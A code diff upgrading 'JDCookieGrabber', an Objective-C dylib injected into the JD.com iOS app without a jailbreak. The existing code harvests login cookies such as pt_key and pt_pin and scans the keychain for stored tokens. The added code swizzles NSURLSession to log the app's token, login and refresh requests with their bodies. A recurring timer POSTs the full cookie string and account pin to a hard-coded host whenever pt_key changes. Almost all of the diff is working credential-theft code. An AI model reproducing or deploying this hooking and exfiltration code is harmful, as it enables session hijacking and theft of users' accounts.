@@ -1,7 +1,5 @@
-// JDCookieGrabber.m — 京东完整登录态采集 dylib（TrollFools 注入，无越狱）
-// 参考已验证的 CMCC.dylib 骨架：悬浮球 + WKWebView swizzle 注入 JS + WKHTTPCookieStore + NSHTTPCookieStorage
-// 采集：jd 系全部 cookie（pt_key/pt_pin/shshshfpa/shshshfpx/__jda/__jdu 等指纹 cookie）+ 京东 App UA + H5 页面 cookie
-// 导出：一键复制到剪贴板（JSON v1 格式，psyduck-iOS App 直接解析），并追加写 Documents/jd_cookie.log
+// JDCookieGrabber.m v4 — 京东完整登录态采集（TrollFools 注入，无越狱）
+// v4: URLSession 请求记录(抓 App 自己的换票调用) + pt_key 变化自动 HTTP 上报电脑
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
@@ -10,7 +8,8 @@
 
 #define HANDLER_NAME @"jdHook"
 #define LOG_FILE     @"jd_cookie.log"
-#define EXPORT_VER   @"JDCOOKIES_V2"
+#define EXPORT_VER   @"JDCOOKIES_V4"
+#define REPORT_URL   @"http://192.168.38.239:17777/jd"
 
 // 全局采集池（声明提前, 供 exportNow 与深挖段共用）
 static NSMutableArray *g_kcHits = nil;  // [{svc, acct, len, data}] keychain 命中
@@ -336,6 +335,95 @@ static void ensureFloatButton(void) {
 }
 @end
 
+#pragma mark - v4: URLSession 换票调用记录 + pt_key 变化自动上报
+
+static NSString *g_lastPtKey = nil;
+
+// pt_key 变化 → HTTP POST 上报电脑 (电脑端监听 17777)
+static void reportIfPtKeyChanged(void) {
+    NSString *ck = cookieStringFromNative();
+    NSRange r = [ck rangeOfString:@"pt_key=([^;]+)" options:NSRegularExpressionSearch];
+    if (r.location == NSNotFound) return;
+    NSString *nk = [[ck substringWithRange:r] substringFromIndex:7];
+    if (nk.length < 20) return;
+    if (g_lastPtKey && [nk isEqualToString:g_lastPtKey]) return;
+    BOOL changed = g_lastPtKey != nil && ![nk isEqualToString:g_lastPtKey];
+    g_lastPtKey = nk;
+    appendLog([NSString stringWithFormat:@"[ptkey] %@ len=%lu%@", [nk substringToIndex:20], (unsigned long)nk.length, changed ? @" CHANGED" : @" first"]);
+    if (!changed) return; // 首次只记日志, 变化才上报
+
+    // 组上报 JSON: pin + 全 cookie + ts
+    NSString *pin = @"";
+    NSRange rp = [ck rangeOfString:@"pt_pin=([^;]+)" options:NSRegularExpressionSearch];
+    if (rp.location != NSNotFound) {
+        NSString *vp = [ck substringWithRange:rp];
+        pin = [vp substringFromIndex:7];
+    }
+    NSDictionary *out = @{@"v": EXPORT_VER, @"pin": pin, @"cookie": ck, @"ts": @((long)[NSDate date].timeIntervalSince1970)};
+    NSData *jd = [NSJSONSerialization dataWithJSONObject:out options:0 error:nil];
+    NSMutableURLRequest *rq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:REPORT_URL]];
+    rq.HTTPMethod = @"POST";
+    rq.timeoutInterval = 8;
+    rq.HTTPBody = jd;
+    [rq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    NSURLSession *ses = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration ephemeralSessionConfiguration]];
+    [[ses dataTaskWithRequest:rq completionHandler:^(NSData *d, NSURLResponse *resp, NSError *err) {
+        NSInteger sc = 0;
+        if (resp && [resp isKindOfClass:[NSHTTPURLResponse class]]) sc = ((NSHTTPURLResponse *)resp).statusCode;
+        appendLog([NSString stringWithFormat:@"[report] status=%ld err=%@", (long)sc, err.localizedDescription ?: @"none"]);
+    }] resume];
+}
+
+// URLSession swizzle: 记录 App 自己的换票/登录态调用 (genToken/token/login/autoToken/refresh)
+@implementation NSURLSession (JDV4)
+
++ (void)load {
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSArray *sels = @[@"dataTaskWithRequest:completionHandler:", @"dataTaskWithRequest:"];
+        for (NSString *sn in sels) {
+            SEL orig = NSSelectorFromString(sn);
+            SEL hook = NSSelectorFromString([NSString stringWithFormat:@"jd4_%@", sn]);
+            Method m1 = class_getInstanceMethod(self, orig);
+            Method m2 = class_getInstanceMethod(self, hook);
+            if (m1 && m2) method_exchangeImplementations(m1, m2);
+        }
+    });
+}
+
+- (NSURLSessionDataTask *)jd4_dataTaskWithRequest:(NSURLRequest *)req completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))h {
+    @try {
+        NSString *url = req.URL.absoluteString ?: @"";
+        NSString *body = req.HTTPBody ? [[NSString alloc] initWithData:req.HTTPBody encoding:NSUTF8StringEncoding] ?: @"" : @"";
+        BOOL interesting = [url containsString:@"api.m.jd.com"] &&
+            ([url containsString:@"genToken"] || [url containsString:@"Token"] || [url containsString:@"login"] ||
+             [url containsString:@"autoToken"] || [url containsString:@"refresh"] || body.length > 0);
+        if (interesting) {
+            NSString *rec = [NSString stringWithFormat:@"[url4] %@\n[body4] %@", [url substringToIndex:MIN((NSUInteger)500, url.length)], [body substringToIndex:MIN((NSUInteger)1200, body.length)]];
+            appendLog(rec);
+            // 也塞进 g_reqHits 池, 悬浮球导出可见
+            if (!g_reqHits) g_reqHits = [NSMutableArray array];
+            if (g_reqHits.count < 40) {
+                [g_reqHits addObject:@{@"url": [url substringToIndex:MIN((NSUInteger)200, url.length)], @"k": @"url4", @"v": [body substringToIndex:MIN((NSUInteger)600, body.length)]}];
+            }
+        }
+    } @catch (NSException *e) { }
+    return [self jd4_dataTaskWithRequest:req completionHandler:h];
+}
+
+- (NSURLSessionDataTask *)jd4_dataTaskWithRequest:(NSURLRequest *)req {
+    @try {
+        NSString *url = req.URL.absoluteString ?: @"";
+        if ([url containsString:@"api.m.jd.com"] &&
+            ([url containsString:@"genToken"] || [url containsString:@"Token"] || [url containsString:@"login"])) {
+            appendLog([NSString stringWithFormat:@"[url4-nocb] %@", [url substringToIndex:MIN((NSUInteger)400, url.length)]]);
+        }
+    } @catch (NSException *e) { }
+    return [self jd4_dataTaskWithRequest:req];
+}
+
+@end
+
 #pragma mark - 定时导出（无按钮路径）
 
 static void dumpToPasteboard(void) {
@@ -358,9 +446,10 @@ static void JDCookieGrabberInit(void) {
             if (!g_floatWin) ensureFloatButton();
         });
     }
-    // 启动后扫 keychain（a2/wskey 窝点）+ 定时刷剪贴板
+    // 启动后扫 keychain（a2/wskey 窝点）+ 定时刷剪贴板 + pt_key 变化上报
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
         dumpKeychain();
+        reportIfPtKeyChanged();
         dumpToPasteboard();
     });
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(30 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
@@ -368,12 +457,14 @@ static void JDCookieGrabberInit(void) {
     });
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(120 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
         dumpKeychain();
+        reportIfPtKeyChanged();
         dumpToPasteboard();
     });
     dispatch_source_t timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
     dispatch_source_set_timer(timer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)), 300 * NSEC_PER_SEC, 10 * NSEC_PER_SEC);
     dispatch_source_set_event_handler(timer, ^{
         dumpKeychain();
+        reportIfPtKeyChanged();
         dumpToPasteboard();
     });
     dispatch_resume(timer);
